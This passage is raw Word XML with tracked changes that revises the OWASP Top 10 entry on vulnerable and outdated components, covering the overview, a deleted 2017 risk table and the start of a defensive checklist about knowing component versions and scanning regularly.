      </w:ins>
    </w:p>
    <w:p w14:paraId="2F44F871" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2232" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03FBCE16" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2233" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2234" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E1DDCF5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2235" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB2A156" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2236" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2237" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>It was #2 from the Top 10 community survey but also had enough data to make the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="01E41D50" w14:textId="2734BA74" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2238" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Top 10 via data. Vulnerable</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Components </w:t>
      </w:r>
      <w:del w:id="2239" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>with Known Vulnerabilities</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2240" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>are a known issue that we</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2CE1B554" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2241" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F63267" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2242" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2243" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="24F87FEC" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2244" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2245" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6C5046CA" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2246" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2247" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 2 | Prevalence 3 : Detectability 2 | Technical 2 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5EB8AD37" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2248" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2249" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit. | Prevalence of this issue is very widespread. Component-heavy development patterns can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date. Some scanners such as retire.js help in detection, but determining exploitability requires additional effort. | While some known vulnerabilities lead to only minor impacts, some of the largest breaches to date have relied on exploiting known vulnerabilities in components. Depending on the assets you are protecting, perhaps this risk should be at the top of the list. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6DD9FE4E" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2250" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EFDE2AE" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2251" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2252" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="27453AF7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2253" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2254" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>struggle to test and assess risk and is the only category to not have</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25F3D25A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2255" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2256" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploits/impact</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="15D98F27" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2257" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2258" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>weight of 5.0 is used. Notable CWEs included are *CWE-1104: Use of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56559772" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2259" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2260" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Unmaintained Third-Party Components* and the two CWEs from Top 10 2013</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C9FC6CF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2261" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2262" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>and 2017.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="089AB73D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2263" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32744FF1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2264" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2265" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="332B8D8B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28E1E1CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>You are likely vulnerable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9FE97B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DCD117E" w14:textId="4CEE203A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2266" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2267" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2268" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If you do not know the versions of all components you use (both</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F24C159" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2269" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2270" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> client-side and server-side). This includes components you directly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201A647A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2271" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> use as well as nested dependencies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8D5A70" w14:textId="665723F0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2272" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2273" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5CD3446A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2274" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2275" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If</w:t>
      </w:r>
      <w:ins w:id="2276" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> the</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> software is vulnerable, unsupported, or out of date. This</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF48C85" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2277" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2278" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> includes the OS, web/application server, database management system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BFA760" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2279" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2280" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (DBMS), applications, APIs and all components, runtime environments,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A84FEA4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2281" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and libraries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B29C194" w14:textId="380AAA58" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2282" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2283" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6BF42919" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2284" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2285" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If you do not scan for vulnerabilities regularly and subscribe to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D99839" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2286" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
